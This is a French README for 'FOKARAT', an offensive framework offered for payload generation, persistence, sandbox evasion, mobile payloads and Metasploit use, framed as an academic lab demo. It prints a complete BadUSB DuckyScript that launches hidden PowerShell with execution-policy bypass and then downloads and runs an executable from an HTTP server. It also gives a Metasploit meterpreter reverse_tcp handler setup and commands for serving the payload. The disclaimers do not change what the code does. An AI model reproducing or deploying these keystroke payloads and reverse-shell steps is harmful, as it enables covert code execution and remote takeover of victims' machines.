# FOKARAT Framework

Framework modulaire conçu pour la génération de payloads, la persistance, l’obfuscation, la gestion de listeners, le support IA locale et la démonstration de flux autorisés dans des environnements de laboratoire contrôlés.

Important : ce projet est destiné uniquement à des environnements de test autorisés, légaux et conformes aux politiques applicables. Son utilisation doit être strictement limitée à des contextes de recherche, de démonstration ou d’évaluation internes, avec consentement explicite.

## 1. Contexte académique et objectif

FOKARAT a été conçu pour servir de cadre technique de démonstration dans le contexte d’une thèse, d’un mémoire de BAC ou d’une présentation professionnelle. Il permet de montrer :

- la génération de payloads Windows / Linux / macOS
- la mise en place d’un reverse handler local
- la gestion d’un listener HTTP / TCP / HTTPS
- la génération de scripts Ducky / BadUSB en mode démonstration
- la persistance et la préparation de stubs de test
- la détection de sandbox et l’obfuscation légère
- la génération de payloads mobile (Android / iOS) comme preuve de concept
- l’intégration d’un assistant IA local optionnel

Le projet met l’accent sur la structure, la clarté du code, la documentation, l’autonomie du système, ainsi que sur un usage responsable et rigoureux.

## 2. Positionnement éthique et légal

Ce framework est fourni dans une logique de laboratoire et de démonstration. Il ne doit pas être utilisé :

- sur des systèmes non autorisés
- dans un environnement sans consentement explicite
- pour contourner des mécanismes de sécurité légitimes
- pour exploiter des vulnérabilités hors du cadre universitaire ou professionnel autorisé

Le mode BadUSB embarqué dans le système est volontairement limité à une version de démonstration lab-safe, destinée à des tests internes contrôlés uniquement.

## 3. Structure du projet

```bash
Framework/
├── Framework/
│   ├── ai/
│   ├── core/
│   ├── mobile/
│   ├── modules/
│   ├── gui.py
│   ├── main.py
│   ├── config.yaml
│   ├── requirements.txt
│   ├── README.md
│   └── inject.duck
├── .venv/
├── run.sh
└── README.md
```

## 4. Installation

```bash
cd "/home/fokas/Bureau/Fokas Framework"
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r Framework/Framework/requirements.txt
```

## 5. Lancement

### Mode CLI

```bash
cd "/home/fokas/Bureau/Fokas Framework"
source .venv/bin/activate
cd Framework/Framework
python main.py --cli
```

### Mode GUI

```bash
cd "/home/fokas/Bureau/Fokas Framework"
source .venv/bin/activate
cd Framework/Framework
python main.py --gui
```

### Script de lancement rapide

```bash
cd "/home/fokas/Bureau/Fokas Framework"
./run.sh
```

## 6. Menu principal du framework

L’interface est présentée en français et structurée pour une utilisation professionnelle.

```text
[01]  Payloads & exécution
[02]  Reverse handlers
[03]  Listeners & serveurs
[04]  Persistance / WMI
[05]  Évitement / sandbox / Speck
[06]  Mobile / Android / iOS
[07]  Assistant IA / polymorphisme
[08]  BadUSB / DuckyScript
[09]  Interface graphique
[10] Ouvrir msfconsole
[11] Searchsploit
[12] Paramètres réseau
[13] Nettoyage des listeners
[14] Aide rapide
[15] Crédits
[16] Quitter
```

## 7. BadUSB : démonstration contrôlée et lab-safe

La fonctionnalité BadUSB est clairement intégrée au framework et visible dans le menu principal. Elle est conçue comme un module de démonstration autorisée pour un environnement de test contrôlé.

### Objectif

Le module BadUSB permet de :

- générer un script DuckyScript de démonstration
- préparer un flux USB de type “dropper” dans un environnement contrôlé
- simuler une exécution de payload depuis un serveur HTTP local
- servir de preuve de concept académique ou de démonstration de laboratoire

### Limite de la version

Cette version ne prétend pas à une évasion avancée ni à un contournement actif de Windows Defender. Elle est volontairement limitée à un modèle sécurisé, explicite et professionnel, compatible avec un cadre d’usage autorisé et documenté.

### Exemple de génération

```bash
1. Lancer le framework
2. Sélectionner l’option BadUSB
3. Générer le script `inject.duck`
4. Vérifier le fichier produit
5. Tester uniquement dans un environnement lab autorisé
```

### Script généré

```text
REM BadUSB — démonstration contrôlée
REM Objectif : télécharger un payload depuis un serveur HTTP local
REM Mode autorisé : environnement contrôlé uniquement
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Host 'Démonstration BadUSB'; Start-Sleep -Seconds 2; $url = 'http://192.168.1.100:8080/payload.exe'; $dest = Join-Path $env:TEMP 'payload_demo.exe'; (New-Object System.Net.WebClient).DownloadFile($url, $dest); Start-Process $dest"
ENTER
DELAY 2000
CTRL s
```

### Servir un payload localement

```bash
python3 -m http.server 8080 --directory /chemin/vers/le/repertoire
```

## 8. Génération de payloads

Le framework propose plusieurs voies de génération :

- Python via generateur interne
- C++ via compilation locale
- reverse handlers via listener et Metasploit
- payloads Windows ou Linux selon la configuration de l’environnement

### Exemple de flux de travail académique

1. configurer LHOST / LPORT
2. générer un payload de démonstration
3. préparer un listener local
4. vérifier la connexion dans un environnement autorisé
5. documenter les résultats dans le rapport ou la thèse

## 9. Reverse handler Metasploit

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

## 10. Sécurité et usage responsable

- utilisation réservée aux systèmes autorisés
- test uniquement dans un environnement contrôlé
- conformité aux politiques internes et légales
- documentation claire du contexte d’usage
- absence de bypass antivirus ou de mécanisme d’évasion non autorisé

## 11. Résumé pour présentation professionnelle

Le framework FOKARAT est désormais structuré, fonctionnel et adapté à un cadre professionnel de démonstration. Il propose :

- un menu en français
- des options cohérentes et stables
- un module BadUSB visible et documenté
- une logique de démonstration lab-safe
- un point d’entrée simple pour le lancement en CLI ou GUI
- une base solide pour la thèse, un mémoire de BAC, ou une présentation technique

L’utilisation commerciale ou académique reste strictement encadrée par le respect des règles de sécurité et de légalité applicables.